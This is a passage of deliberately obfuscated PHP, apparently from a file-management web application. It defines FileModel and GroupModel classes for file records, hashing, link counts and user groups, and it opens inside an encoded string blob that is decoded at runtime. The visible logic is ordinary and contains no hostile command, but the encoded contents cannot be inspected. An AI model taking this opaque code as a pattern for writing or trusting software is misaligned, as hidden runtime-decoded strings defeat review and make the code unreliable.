%æè|±,m‚±—2¶')."\60\361\112\47\117\123\153\356\266\223\201\1\75\210\210\226\104\42\271\104\333\160\53\161\160\166\274\243\21\35\142\44\237\205\15\27\337\40\26\153\112\42\51\377\213\11\144\322"."\15\25\204\204\251\112\205\236\373\217\146\164\243\302\233\207\322\171\377\67\264\233\362\145\134\222\363\252\266\127\102\110\111\361\247\331\21\62\301\300\267\10\201\323\331\127\127\361".base64_decode('KJsoY8CjTJWonDmTnkYUPqYktgznZlcVp5DXGXGSH320M0LwoCvUsVolZ7Ty3S1S')."\220\274\14\312\213\226\336\300\23\52\34\242\363\201\116\300\32\46\256\63\311\235\275\100\7\277\307\247\112\346\105\116\275\22\36\135\351\331\123\103\376\26\243\216\351\171\204\71".strrev('€"ù¦ì™¬DŸ¹bP‡0ü!u]\'*„D6\\û’¨K‰=snBä;µE')."\xed\x14\xc8\x21\xb1\xf1\xa6\xb5\x49\xbb\xa5\xd8\x18\xc5\x57\x77\x31\x27\x2\x92\x32\x96\xc8\x3f\x3c\xd2\x71\x8b\x16\xfb\x4a\x72\xad\x7c\x76\x37\xd7\x72\x3d\xc\x4a\x5d\xad\xd2\x6f\xc6\xa6\xff"."\xff\x7e\xfb\xee\xff\xd6\x93\x77\xb3\xeb\x99\xda\xdc\xf1\xb0\x6e\x7\x30\xcb\x8c\x3f\x9b\x94\x9c\x34\x53\x95\xad\xab\x1f\xce\x4d\x73\x4f\xc0\x22\xfe\x86\xb4\x14\xe6\x86\xac\xcc\x5f\x16\x73\xa3"."\xa5\xb2\x63\x1e\x35\x9b\x95\xb6\xd6\xca\xe2\x45\xd9\x8b\xa4\x8\xf9\x46\xf8\x73\x96\x95\x2\xee\xb\x63\xee\xd7\x49\xfb\xd8\x3b\xdf\xe4\xe1\xd1\x81\x4a\x9\x5\xe5\xe1\x52\x4c\x5\x3c\xa6\x20"."\306\274\346\313\117\72\361\174\205\235\56\216\45\46\243\54\231\250\25\361\42\314\365\230\237\175\245\260\300\206\71\121\106\146\345\233\242\221\2\23\355\152\201\262\17\34\315\310"."\21\271\173\16\124\111\246\104\16\120\31\375\212\73\146\301\1\224\7\30\146\15\137\256\165\276\12\17\71\272\134\257\53\322\104\226\74\232\16\345\72\341\133\12\105\333\345\66"."\x89\xa\x27\x72\x2e\xf9\x6c\xbc\xbc\x2\x4e\x1c\xe4\x2c\xd8\xa8\xd8\xa9\x92\xe2\x8f\x6e\xd7\xbb\x5f\xe1\x6e\xf0\x96\x57\x46\x6d\xfa\xb1\x56\x24\x8a\xf5\x10\x4c\xb3\x44\x8e\x68\xc8\x11\x6a\x85".base64_decode('PBSZYyLNFMup8qLmD18KNRv+kvvLiEOPaZCxc0K5bkay2ZSehZ7uK9uCGEF0zAoS').base64_decode('xMQZoG4QV+gsa29XDbmewnZ78cgyXmfC9SFWlrcbHHGw3yqiDpQ3dnZjTDK4BpBD').base64_decode('aWfJr044c2ITeudyW1QpWcowLSkZh1dKizFMVkrIcfh9XNsxF8KrvdubPRHVqfTt').strrev('Bê·ÅúÌ\\“E,=E¦#.û{”óœ9Ò	BfœÌ‘ ÇŸ;Oˆ˜§IV˜áÂ')."\xc2\x7d\x3\x89\xa6\x27\xc\x1\xe9\xe9\x65\x77\x2e\xe7\x93\xdd\xd2\xa1\x69\x8a\x60\x5e\xb0\xfc\x5c\x4c\x1c\xd7\x49\xac\x8\xcb\x86\x85\x25\xb1\x4b\xb8\xe0\x95\x1e\x9d\x1e\x54\xc7\x4\x1f\x25"."\330\365\164\232\77\10\357\110\232\146\2\13\207\42\210\170\73\36\363\141\322\105\135\141\343\255\215\273\137\341\365\311\227\173\35\11\313\241\342\42\257\224\137\234\220\210\156\142"."\130\245\356\223\345\344\314\56\137\24\346\110\45\100\364\201\3\156\142\44\211\106\370\36\203\260\75\242\135\341\162\276\250\322\171\55\231\47\343\163\206\322\220\133\43\136\7\324"."\x25\xec\x61\xad\x9\x63\x2a\x5c\x51\x96\xfc\xd6\xbd\xf3\x2c\x54\x56\x3c\x48\x28\xa0\x65\xc3\x52\x71\xf2\x39\xe9\x94\x19\x62\x95\x2b\x11\x58\xe9\x1c\x62\xe9\x3e\xb7\x88\x60\xbb\xa1\xe1\x18\x7c"."\211\104\362\216\101\312\250\34\351\150\216\173\152\211\234\42\320\227\2\163\104\107\113\343\2\316\50\232\136\163\265\136\316\340\356\31\315\141\215\353\166\52\43\11\117\345\221\345"."\x70\xb3\x6c\x50\xa1\xa2\xca\xed\x75\xb7\x8a\x8d\xa9\x5b\xa4\x14\x85\x94\xb5\x47\x32\xb6\x88\x1b\x15\xf2\xd0\x16\x55\xcc\x46\xa3\x70\x4e\xc1\xd1\x3a\xf2\x4e\x31\x4\x38\x2f\x8d\xc2\x79\xcb\xa2"."\131\146\111\3\43\345\263\325\242\65\105\367\312\7\17\324\22\351\12\35\166\11\357\64\351\124\343\131\61\161\171\165\200\161\356\324\104\217\121\271\25\102\375\340\72\364\256\324"."\x8a\x8a\x89\xa7\x6c\x85\x48\xed\xda\x5\x2a\xd1\x5a\x16\x53\x81\xba\xa\xeb\x87\x72\x3a\x2e\xe2\x2a\xd8\x62\xd0\x32\xf1\x1e\x2d\xfb\x77\xaa\x10\x2d\x1b\x76\x54\x36\xfd\x88\x56\x5c\xfa\x96\xd3".strrev('æ\'4¬²º`7şØu&‘ø7’?1{è;§ª¬”Î¬É„†Øwy\\—Ã&')."\x8b\x92\x77\xd4\x8a\x46\xde\x1e\x2c\xfa\x97\xb\xd9\x59\x95\xa9\xf5\x25\xeb\x78\x2a\x15\x19\xb6\x9e\xd2\x9c\x2e\x58\x65\x37\x4f\x34\x9e\x55\x92\x95\xd4\x87\x2e\xcd\x9d\x50\x44\x38\x6c\x6\x2a".strrev('~@£qqÁí¦*û¥¸‰¨üÛÅlp=©À\'Ê­Ç	À‹Iå§!¡:ø¶è')."\133\14\333\26\7\360\124\362\47\314\40\336\34\75\222\175\11\372\22\347\112\270\121\344\300\202\240\55\41\57\344\23\216\76\261\110\35\323\150\54\41\112\216\0\76\10\341\1"."\x79\xef\x83\x23\xd0\xf6\xa2\xeb\x90\x56\x0\x90\xfc\x9a\x34\x26\x98\x73\x46\x7c\x13\x5a\xb4\x7\x9f\x5d\x48\x43\x26\xf8\x13\x40\x3f\xd9\x42\x86\xdc\x31\xb7\xfc\x34\xc6\xf\x4e\xfd\xbd\x2a\x66"."\x14\xe1\xd1\x2d\xdf\x30\x7b\x7a\x12\xb2\xd3\xa7\x8b\xb8\xd5\xe7\x37\x95\x0\x8a\x56\x51\x4\xf5\xe8\x4d\xd4\x61\x70\x7d\x24\x16\x8f\x95\x45\xf5\x4\x62\xb1\x65\x91\x68\x1b\x75\x0\x5e\x16\x4d"."\162\111\26\107\145\121\75\235\221\356\251\342\202\135\201\120\270\54\16\33\47\165\47\204\47\56\32\25\352\41\255\44\47\174\123\265\42\324\272\104\264\204\234\45\13\375\175\41".base64_decode('YzC1PDvfiKlZJshLlyO1nHDJJvLk9dSI0P+pEvNuMW+F/MP5mo7LBpAhKRSEDYu6').base64_decode('oexoAaDYITpf65yRFofjPschugQn64EQGAnn5I2WAGZUHCBZ91t+FkFixQDghh1j')."\200\125\332\260\221\224\316\32\250\30\3\27\24\141\110\45\343\61\372\355\210\266\325\241\212\147\311\124\341\207\127\274\120\305\375\37\211\274\131\60\134\252\0\0".base64_decode('')."".base64_decode(''), 10, -8))); goto eÁ‡ŞÅÊÌå; BçâÒß…Ş: class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\146\x69\154\145"; protected $tableMeta = array("\x74\x61\142\x6c\x65\116\141\155\145" => "\x69\157\137\x66\x69\x6c\145\137\x6d\145\x74\141", "\155\x65\164\x61\x46\x69\x65\x6c\x64" => "\146\x69\x6c\145\x49\104"); public function fileInfo($ú¬¯òÆ²) { $€™Ø¢™­ =& $_SERVER[™¾ÇÙ¯¹]; static $¿ÆóŞ•° = array(); if (!isset($¿ÆóŞ•°[$ú¬¯òÆ²])) { $¾Í’èŞÎ = $€™Ø¢™­[1886]; $à ŸôŞ = Model($€™Ø¢™­[479])->field($¾Í’èŞÎ)->where(array($€™Ø¢™­[477] => $ú¬¯òÆ²))->find(); $¿ÆóŞ•°[$ú¬¯òÆ²] = $à ŸôŞ; } return $¿ÆóŞ•°[$ú¬¯òÆ²]; } public function addFileByContent($¸Òº‚öé = '', $ëƒÖõßİ = '') { $‘ØæÑ† =& $_SERVER[™¾ÇÙ¯¹]; $ÉÇŠ±³… = TEMP_PATH . $‘ØæÑ†[1887]; if (!is_dir($ÉÇŠ±³…)) { mk_dir($ÉÇŠ±³…); } $™è‡î‚ñ = $ÉÇŠ±³… . $‘ØæÑ†[1888] . rand_string(16); file_put_contents($™è‡î‚ñ, $¸Òº‚öé); $ìÔ´úÅ = $this->addFile($™è‡î‚ñ, $ëƒÖõßİ, !0); if (file_exists($™è‡î‚ñ)) { @unlink($™è‡î‚ñ); } return $ìÔ´úÅ; } public function createFileName($œĞ‘”Ø, $ŠÆÖš = false, $Ø±ÈÚ×× = false) { $¸ıû°Ôë =& $_SERVER[™¾ÇÙ¯¹]; $¾ìú¨ı = IO::init($¸ıû°Ôë[8]); $äïš†è’ = $this->makeFilePath($œĞ‘”Ø, $¾ìú¨ı, $ŠÆÖš, $Ø±ÈÚ××); $ñüËëúÊ = $¾ìú¨ı->pathFather($äïš†è’); static $±şâË•” = false; $¯û¸Î² = $¸ıû°Ôë[1889] . md5($ñüËëúÊ); if (!$±şâË•” && !Cache::get($¯û¸Î²)) { $±şâË•” = !0; $ßóûûÆô = IO::mkdir($ñüËëúÊ); if (!IO::exist($ßóûûÆô . $¸ıû°Ôë[812])) { IO::mkfile($ßóûûÆô . $¸ıû°Ôë[812]); } Cache::set($¯û¸Î², 1, 3600 * 2); } return $äïš†è’; } public function makeFilePath($¶‰˜ì×, $µİäÊ‘, $‡»Ö®Ş˜ = false, $À’ì®…³ = false) { $°ç¼¹£ˆ =& $_SERVER[™¾ÇÙ¯¹]; $Ş±»„ˆİ = Model($°ç¼¹£ˆ[785])->get($°ç¼¹£ˆ[1890]); $‘œ”ˆíª = KodIO::defaultIO() . date($°ç¼¹£ˆ[1891]); $›”îæŒü = $‘œ”ˆíª . rand_string(5) . short_id(100); $¶‰˜ì× = str_replace($°ç¼¹£ˆ[8], $°ç¼¹£ˆ[11], KodIO::clear($¶‰˜ì×)); $ç¾™Øó = $µİäÊ‘->ext($¶‰˜ì×); if (!$¶‰˜ì×) { $Ş±»„ˆİ = $°ç¼¹£ˆ[1892]; } switch ($Ş±»„ˆİ) { case $°ç¼¹£ˆ[1893]: $›”îæŒü = $›”îæŒü . $°ç¼¹£ˆ[10] . $µİäÊ‘->ext($¶‰˜ì×); if ($ç¾™Øó == $°ç¼¹£ˆ[1830]) { $›”îæŒü .= $°ç¼¹£ˆ[1560]; } break; case $°ç¼¹£ˆ[1894]: $ä²¶‹ôÌ = Model($°ç¼¹£ˆ[785])->get($°ç¼¹£ˆ[786]); $ò¶àèËÉ = substr(md5($°ç¼¹£ˆ[787] . $ä²¶‹ôÌ . date($°ç¼¹£ˆ[763])), 0, 8); $ÖÑ³ï‹ = KodIO::defaultDriver(); $‘œ”ˆíª = $°ç¼¹£ˆ[1237] . $ÖÑ³ï‹[$°ç¼¹£ˆ[407]] . $°ç¼¹£ˆ[417] . date($°ç¼¹£ˆ[1895]) . $ò¶àèËÉ . $°ç¼¹£ˆ[8]; if ($ç¾™Øó == $°ç¼¹£ˆ[1830]) { $¶‰˜ì× .= $°ç¼¹£ˆ[1560]; } $¹¹‹¿î = $°ç¼¹£ˆ[1896] . $‘œ”ˆíª . $¶‰˜ì×; CacheLock::lock($¹¹‹¿î); $›”îæŒü = $‘œ”ˆíª . $¶‰˜ì×; if (IO::exist($‘œ”ˆíª . $¶‰˜ì×)) { $œ´¶ÆÈ = substr($¶‰˜ì×, 0, strlen($¶‰˜ì×) - strlen($ç¾™Øó)); $Ó‹–ÒŞä = $À’ì®…³ ? substr($À’ì®…³, 0, 5) : ($‡»Ö®Ş˜ ? substr($‡»Ö®Ş˜, 0, 5) : rand_string(5)); $›”îæŒü = $‘œ”ˆíª . $œ´¶ÆÈ . $Ó‹–ÒŞä . $°ç¼¹£ˆ[10] . $ç¾™Øó; } if (IO::isTypeObject($›”îæŒü) && !IO::isUploadServer($›”îæŒü)) { if (IO::exist($›”îæŒü)) { return $›”îæŒü; } $Ù„‰ŞŞ = IO::setContent($›”îæŒü, $°ç¼¹£ˆ[12]); if (!$Ù„‰ŞŞ) { show_json($°ç¼¹£ˆ[1897], !1); } } CacheLock::unlock($¹¹‹¿î); break; case $°ç¼¹£ˆ[1892]: break; default: break; } return $›”îæŒü; } public function addFileByRemote($õø¼èï, $×Ş§¨§ê, $ƒï²¡³ª = array()) { $‡€É–£« =& $_SERVER[™¾ÇÙ¯¹]; if (!IO::exist($õø¼èï)) { return !1; } $¾›¨‚ÈÍ = $ƒï²¡³ª[$‡€É–£«[176]] ? $ƒï²¡³ª[$‡€É–£«[176]] : $‡€É–£«[12]; $ó£ôê§é = IO::hashMd5($õø¼èï, $¾›¨‚ÈÍ); $ß˜ŸŞ• = KodIO::defaultDriver(); $¤Ì– ÈÛ = array($‡€É–£«[593] => IO::size($õø¼èï), $‡€É–£«[1898] => 1, $‡€É–£«[428] => $×Ş§¨§ê, $‡€É–£«[823] => $ß˜ŸŞ•[$‡€É–£«[407]], $‡€É–£«[429] => $õø¼èï, $‡€É–£«[1899] => $ƒï²¡³ª[$‡€É–£«[177]] ? $ƒï²¡³ª[$‡€É–£«[177]] : IO::hashSimple($õø¼èï), $‡€É–£«[1900] => $ó£ôê§é ? $ó£ôê§é : $¾›¨‚ÈÍ); if ($Ç£ø°„ã = $this->addFileCheckExist($¤Ì– ÈÛ[$‡€É–£«[177]], $¤Ì– ÈÛ[$‡€É–£«[176]], $¤Ì– ÈÛ[$‡€É–£«[76]])) { return $Ç£ø°„ã; } return $this->addFileData($¤Ì– ÈÛ); } private function addFileData($æó²ëƒ€) { $å×Œµò =& $_SERVER[™¾ÇÙ¯¹]; if (!$æó²ëƒ€) { return !1; } $æó²ëƒ€[$å×Œµò[76]] = intval($æó²ëƒ€[$å×Œµò[76]]); if (!$æó²ëƒ€[$å×Œµò[76]] && strlen($æó²ëƒ€[$å×Œµò[177]]) > 32) { $æó²ëƒ€[$å×Œµò[76]] = intval(substr($æó²ëƒ€[$å×Œµò[177]], 32)); } $ßÅä‚¨« = $this->add($æó²ëƒ€); return $this->find($ßÅä‚¨«); } public function addFile($ÀÔ‹‡ÏÍ, $ó€ßìêå, $š¼ıãş€ = false) { $ÚÂí± =& $_SERVER[™¾ÇÙ¯¹]; $ä¾ÙäºÏ = IO::hashSimple($ÀÔ‹‡ÏÍ); $Ú¬ÇşãÉ = IO::size($ÀÔ‹‡ÏÍ); $êà˜à“‹ = $Ú¬ÇşãÉ <= 1024 * 1024 * 10 ? IO::hashMd5($ÀÔ‹‡ÏÍ) : $ÚÂí±[12]; $Ã¤ù—Û = $ÚÂí±[1901] . $ä¾ÙäºÏ; CacheLock::lock($Ã¤ù—Û); if ($êà˜à“‹ && $ä¾ÙäºÏ) { $ûè­±Öò = $this->addFileCheckExist($ä¾ÙäºÏ, $êà˜à“‹, $Ú¬ÇşãÉ); if ($ûè­±Öò) { CacheLock::unlock($Ã¤ù—Û); return $ûè­±Öò; } } $¾±‡‡“ = $this->addFileMake($ÀÔ‹‡ÏÍ, $Ú¬ÇşãÉ, $ä¾ÙäºÏ, $êà˜à“‹, $ó€ßìêå, $š¼ıãş€); $±Â†¡œû = $this->addFileData($¾±‡‡“); CacheLock::unlock($Ã¤ù—Û); if (!$êà˜à“‹ && $±Â†¡œû) { $this->fileMd5Check($±Â†¡œû); } return $±Â†¡œû; } private function fileMd5Check($ºª»ö±ª) { $Á€·Éâ¥ =& $_SERVER[™¾ÇÙ¯¹]; $¸ø¡Úî¾ = array($ºª»ö±ª[$Á€·Éâ¥[476]], $ºª»ö±ª[$Á€·Éâ¥[84]]); $æéæŞ‰ù = $Á€·Éâ¥[1902] . $ºª»ö±ª[$Á€·Éâ¥[84]]; $£¤€£øÙ = $Á€·Éâ¥[1903] . $ºª»ö±ª[$Á€·Éâ¥[476]]; $«ç±Æõ´ = TaskQueue::add($Á€·Éâ¥[1904], $¸ø¡Úî¾, $æéæŞ‰ù, $£¤€£øÙ); if (!$«ç±Æõ´) { $this->fileMd5Set($ºª»ö±ª[$Á€·Éâ¥[476]], $ºª»ö±ª[$Á€·Éâ¥[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($ñ ›„æ, $‡¡ùæ±¼) { $¥°òıøÖ =& $_SERVER[™¾ÇÙ¯¹]; $Àªõãò– = $this->find($ñ ›„æ); if (!$Àªõãò– || $Àªõãò–[$¥°òıøÖ[176]]) { return; } $Ü»ğÀ¶± = IO::hashMd5($‡¡ùæ±¼); if (!$Ü»ğÀ¶±) { return $¥°òıøÖ[12]; } $this->where(array($¥°òıøÖ[476] => $ñ ›„æ))->save(array($¥°òıøÖ[176] => $Ü»ğÀ¶±)); } public function addFileMake($ëãÚÁŞ, $£ğÁÓ“„, $Ã¦È€Î, $ÌÎä¹¤ˆ, $îœõÔ×µ, $Ã°àñ¹ü) { $Â†İ²Ó =& $_SERVER[™¾ÇÙ¯¹]; $ÇÇÕŠıü = $this->createFileName($îœõÔ×µ, $Ã¦È€Î, $ÌÎä¹¤ˆ); $É÷ÆÅˆ– = get_path_father($ÇÇÕŠıü); $ÉÕ²·‡ö = get_path_this($ÇÇÕŠıü); if ($Ã°àñ¹ü) { $«Î­ëıà = IO::move($ëãÚÁŞ, $É÷ÆÅˆ–, !1, $ÉÕ²·‡ö); } else { $«Î­ëıà = IO::copy($ëãÚÁŞ, $É÷ÆÅˆ–, !1, $ÉÕ²·‡ö); } if (!$«Î­ëıà) { return !1; } $³’¨ÛÆâ = KodIO::defaultDriver(); $ªù©ˆğ” = array($Â†İ²Ó[593] => $£ğÁÓ“„, $Â†İ²Ó[1898] => 1, $Â†İ²Ó[428] => $îœõÔ×µ, $Â†İ²Ó[823] => $³’¨ÛÆâ[$Â†İ²Ó[407]], $Â†İ²Ó[429] => $ÇÇÕŠıü, $Â†İ²Ó[1899] => $Ã¦È€Î, $Â†İ²Ó[1900] => $ÌÎä¹¤ˆ); return $ªù©ˆğ”; } public function addFileCheckExist($¼ÊĞüù¢, $Æ¦æ‰øÏ, $›¼á¬ÉÇ) { $Á¸®™‹¦ =& $_SERVER[™¾ÇÙ¯¹]; $¥ôÜè¹Ö = $this->findByHash($¼ÊĞüù¢, $Æ¦æ‰øÏ); if (!$¥ôÜè¹Ö) { return !1; } $ğü³ñĞÄ = array($Á¸®™‹¦[1898] => intval($¥ôÜè¹Ö[$Á¸®™‹¦[1905]]) + 1, $Á¸®™‹¦[593] => $›¼á¬ÉÇ); $this->where(array($Á¸®™‹¦[477] => $¥ôÜè¹Ö[$Á¸®™‹¦[476]]))->save($ğü³ñĞÄ); return $¥ôÜè¹Ö; } public function remove($Ÿµ–â²) { $this->linkCountChange($Ÿµ–â², !1); $this->clearEmpty(); return !0; } public function linkAdd($Û™Ëå“£) { $this->linkCountChange($Û™Ëå“£, !0); } public function linkCountChange($°¶à°•Ô, $ñï­Äî³) { $­™˜Áñ› =& $_SERVER[™¾ÇÙ¯¹]; if (!$°¶à°•Ô) { return; } if (!is_array($°¶à°•Ô)) { $°¶à°•Ô = array($°¶à°•Ô); } $‰òë¬²ë = array(); foreach ($°¶à°•Ô as $­ İ±š») { $Äõ‡³’é = $­ İ±š» . $­™˜Áñ›[12]; if (!$‰òë¬²ë[$Äõ‡³’é]) { $‰òë¬²ë[$Äõ‡³’é] = 0; } $‰òë¬²ë[$Äõ‡³’é]++; } $¶òñŠ¸ = array(); foreach ($‰òë¬²ë as $­ İ±š» => $¾ñùÈÀ) { $Äõ‡³’é = $¾ñùÈÀ . $­™˜Áñ›[12]; if (!$¶òñŠ¸[$Äõ‡³’é]) { $¶òñŠ¸[$Äõ‡³’é] = array(); } $¶òñŠ¸[$Äõ‡³’é][] = $­ İ±š»; } foreach ($¶òñŠ¸ as $¾ñùÈÀ => $’µ¦ã¨°) { if (!$’µ¦ã¨°) { continue; } $¾ñùÈÀ = $ñï­Äî³ ? $¾ñùÈÀ : -intval($¾ñùÈÀ); $îÁÂôÜê = array($­™˜Áñ›[476] => array($­™˜Áñ›[7], $’µ¦ã¨°)); if ($¾ñùÈÀ < 0) { $îÁÂôÜê[$­™˜Áñ›[1905]] = array($­™˜Áñ›[1023], abs($¾ñùÈÀ)); } $this->where($îÁÂôÜê)->setAdd($­™˜Áñ›[1905], $¾ñùÈÀ); } } public function findByHash($†Õõ¤±À, $ğõ¡¼Ğ = false) { $ÚÍÓâ =& $_SERVER[™¾ÇÙ¯¹]; if (!$†Õõ¤±À && !$ğõ¡¼Ğ) { return !1; } $â¿Ğ¦“ = array($ÚÍÓâ[1899] => $†Õõ¤±À); if ($ğõ¡¼Ğ) { $â¿Ğ¦“ = array($ÚÍÓâ[1900] => $ğõ¡¼Ğ); } return $this->order($ÚÍÓâ[1906])->where($â¿Ğ¦“)->find(); } public function clearEmpty($Ë´Ì¼šÕ = 0) { $¡ä•›Ü» =& $_SERVER[™¾ÇÙ¯¹]; $­£ãŒ‰ = time() - 3600 * 24 * $Ë´Ì¼šÕ; $«œÏáú = $¡ä•›Ü»[1907] . $­£ãŒ‰; $Íˆõß‚´ = $this->where($«œÏáú)->select(); if (!$Íˆõß‚´) { return; } $ª‘’²òŠ = new Task($¡ä•›Ü»[1908], $¡ä•›Ü»[12], count($Íˆõß‚´)); foreach ($Íˆõß‚´ as $‚©÷´ÀÂ) { $ª‘’²òŠ->update(1); $this->resetFile($‚©÷´ÀÂ); } $ª‘’²òŠ->end(); } public function resetFile($‡ôŒüş•) { $©ÈòÕ›† =& $_SERVER[™¾ÇÙ¯¹]; $ğêæé¼ = array($©ÈòÕ›†[477] => $‡ôŒüş•[$©ÈòÕ›†[476]]); $îÃ™òƒ¡ = Model($©ÈòÕ›†[1335])->where($ğêæé¼)->count(); $³²¾ı‚Î = Model($©ÈòÕ›†[1909])->where($ğêæé¼)->count(); $è±Ùï³™ = intval($îÃ™òƒ¡) + intval($³²¾ı‚Î); if ($è±Ùï³™ == 0) { IO::remove($‡ôŒüş•[$©ÈòÕ›†[84]]); Model($©ÈòÕ›†[1910])->delete($‡ôŒüş•[$©ÈòÕ›†[476]]); $this->where($ğêæé¼)->delete(); $this->metaSet($‡ôŒüş•[$©ÈòÕ›†[476]], null, null); return; } if ($‡ôŒüş•[$©ÈòÕ›†[1905]] != $è±Ùï³™) { $this->where($ğêæé¼)->save(array($©ÈòÕ›†[1898] => $è±Ùï³™)); } } public function storageInfo($âò¶œÔ = false) { $×Şêªö  =& $_SERVER[™¾ÇÙ¯¹]; $“¨˜ì‡ö = $this->count() + 0.0; $ˆ„Õ½™Ã = 0; $Ø„şÈå» = 1; $º×¹š†´ = 0; $Š©˜ãˆğ = 5000; for ($«Şã²ê = 0; $«Şã²ê < $“¨˜ì‡ö; $«Şã²ê = $«Şã²ê + $Š©˜ãˆğ) { $ÎàÕøÁù = $this->limit($«Şã²ê, $«Şã²ê + $Š©˜ãˆğ)->select(); foreach ($ÎàÕøÁù as $Ù€Àâ…š) { $Ø„şÈå» += $Ù€Àâ…š[$×Şêªö [76]] * $Ù€Àâ…š[$×Şêªö [1905]]; $ˆ„Õ½™Ã += $Ù€Àâ…š[$×Şêªö [76]] * ($Ù€Àâ…š[$×Şêªö [1905]] - 1); $º×¹š†´ += $Ù€Àâ…š[$×Şêªö [1905]]; } } $İ ‘ĞÙ = array($×Şêªö [1911] => $Ø„şÈå», $×Şêªö [1912] => $ˆ„Õ½™Ã, $×Şêªö [1913] => $ˆ„Õ½™Ã / $Ø„şÈå», $×Şêªö [80] => $“¨˜ì‡ö, $×Şêªö [1914] => $º×¹š†´); return $İ ‘ĞÙ; } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\x75\160"; protected $tableMeta = array("\x74\141\x62\x6c\x65\116\141\x6d\145" => "\147\162\x6f\165\x70\137\155\x65\x74\141", "\155\x65\x74\x61\x46\151\145\154\144" => "\x67\162\157\165\160\x49\x44"); protected function cacheFunctionAlias($‰ÔÅ áŞ) { $ŒÆƒıŠì =& $_SERVER[™¾ÇÙ¯¹]; return array($ŒÆƒıŠì[1915] => array($‰ÔÅ áŞ[0], $ŒÆƒıŠì[1916]), $ŒÆƒıŠì[1917] => array($‰ÔÅ áŞ[0], $ŒÆƒıŠì[1918])); } protected function getInfo($ğ›½Ïá, $×©¨´— = false) { $Ø¶–«—¬ = $this->getInfoSimple($ğ›½Ïá); if (!$Ø¶–«—¬) { return !1; } if ($×©¨´—) { return $this->_listDataApplyItem($Ø¶–«—¬); } return $this->cacheFunctionGet($_SERVER[™¾ÇÙ¯¹][1919], $ğ›½Ïá); } protected function getInfoSimple($Í èı«·, $£ÊŸÚæ = false) { $¼ Â²½¤ =& $_SERVER[™¾ÇÙ¯¹]; if ($£ÊŸÚæ) { $ÒÌŠÍ³ì = array($¼ Â²½¤[1837] => intval($Í èı«·)); $é§õ“èÜ = $this->where($ÒÌŠÍ³ì)->find(); return is_array($é§õ“èÜ) ? $é§õ“èÜ : array(); } return $this->cacheFunctionGet($¼ Â²½¤[1920], $Í èı«·); } protected function groupAdd($ÙÂ­Ïªñ) { $í¶îæ¬ =& $_SERVER[™¾ÇÙ¯¹]; if (!$ÙÂ­Ïªñ[$í¶îæ¬[440]] && isset($ÙÂ­Ïªñ[$í¶îæ¬[1837]]) && $ÙÂ­Ïªñ[$í¶îæ¬[1837]] == 1) { if ($Å®¶µæÒ = $this->getInfoSimple($ÙÂ­Ïªñ[$í¶îæ¬[1837]], !0)) { return $ÙÂ­Ïªñ[$í¶îæ¬[1837]]; } } else { $Å®¶µæÒ = $this->getInfoSimple($ÙÂ­Ïªñ[$í¶îæ¬[440]]); if (!$Å®¶µæÒ) { return !1; } } $Î¦ê¯Ï = $í¶îæ¬[539]; if ($Å®¶µæÒ[$í¶îæ¬[529]]) { $Î¦ê¯Ï = $Å®¶µæÒ[$í¶îæ¬[529]] . $Å®¶µæÒ[$í¶îæ¬[1837]] . $í¶îæ¬[50]; } $×¥àÛá¦ = array($í¶îæ¬[428] => $this->groupNameAuto($ÙÂ­Ïªñ[$í¶îæ¬[440]], $ÙÂ­Ïªñ[$í¶îæ¬[32]]), $í¶îæ¬[409] => $ÙÂ­Ïªñ[$í¶îæ¬[440]], $í¶îæ¬[598] => $Î¦ê¯Ï, $í¶îæ¬[1921] => $ÙÂ­Ïªñ[$í¶îæ¬[1824]], $í¶îæ¬[1922] => 0, $í¶îæ¬[1841] => 0); if (isset($ÙÂ­Ïªñ[$í¶îæ¬[1861]])) { $×¥àÛá¦[$í¶îæ¬[1861]] = $ÙÂ­Ïªñ[$í¶îæ¬[1861]]; } else { $Í¼˜£Ğ = $this->max($í¶îæ¬[1861]); if (!$Í¼˜£Ğ) { $Í¼˜£Ğ = 0; } $×¥àÛá¦[$í¶îæ¬[1861]] = $Í¼˜£Ğ + 1; } if (!empty($ÙÂ­Ïªñ[$í¶îæ¬[1837]])) { $×¥àÛá¦[$í¶îæ¬[1837]] = $ÙÂ­Ïªñ[$í¶îæ¬[1837]]; } $‹ü‹Œ«§ = $this->add($×¥àÛá¦); $this->setNamePinyin($‹ü‹Œ«§, $×¥àÛá¦[$í¶îæ¬[32]]); if (isset($ÙÂ­Ïªñ[$í¶îæ¬[1923]])) { $this->metaSet($‹ü‹Œ«§, array($í¶îæ¬[1923] => $ÙÂ­Ïªñ[$í¶îæ¬[1923]], $í¶îæ¬[1924] => $ÙÂ­Ïªñ[$í¶îæ¬[1924]])); unset($ÙÂ­Ïªñ[$í¶îæ¬[1923]]); unset($ÙÂ­Ïªñ[$í¶îæ¬[1924]]); } Model($í¶îæ¬[1335])->groupRootAdd($‹ü‹Œ«§); return $‹ü‹Œ«§; } protected function groupEdit($¯¤Ô», $ÖĞ¶‘–ë) { $÷‚¹§ø‡ =& $_SERVER[™¾ÇÙ¯¹]; $Ì£Ö–Ö× = $this->getInfoSimple($¯¤Ô»); if (!$Ì£Ö–Ö×) { return !1; } if (!empty($ÖĞ¶‘–ë[$÷‚¹§ø‡[440]])) { $Œ•í°„ = $this->getInfoSimple($ÖĞ¶‘–ë[$÷‚¹§ø‡[440]]); if (!$Œ•í°„) { return !1; } if ($Ì£Ö–Ö×[$÷‚¹§ø‡[1837]] == $Œ•í°„[$÷‚¹§ø‡[1837]]) { return !1; } if ($ÖĞ¶‘–ë[$÷‚¹§ø‡[440]] != $Ì£Ö–Ö×[$÷‚¹§ø‡[440]]) { if ($Œ•í°„[$÷‚¹§ø‡[529]] !== $Ì£Ö–Ö×[$÷‚¹§ø‡[529]] && strpos($Œ•í°„[$÷‚¹§ø‡[529]], $Ì£Ö–Ö×[$÷‚¹§ø‡[529]] . $Ì£Ö–Ö×[$÷‚¹§ø‡[1837]] . $÷‚¹§ø‡[50]) === 0) { return !1; } $ÖĞ¶‘–ë[$÷‚¹§ø‡[598]] = $Œ•í°„[$÷‚¹§ø‡[529]] . $ÖĞ¶‘–ë[$÷‚¹§ø‡[440]] . $÷‚¹§ø‡[50]; $this->_changeChildLevel($Ì£Ö–Ö×, $Œ•í°„); } } if (isset($ÖĞ¶‘–ë[$÷‚¹§ø‡[32]])) { $this->setNamePinyin($¯¤Ô», $ÖĞ¶‘–ë[$÷‚¹§ø‡[32]]); } if (isset($ÖĞ¶‘–ë[$÷‚¹§ø‡[1923]])) { $this->metaSet($¯¤Ô», array($÷‚¹§ø‡[1923] 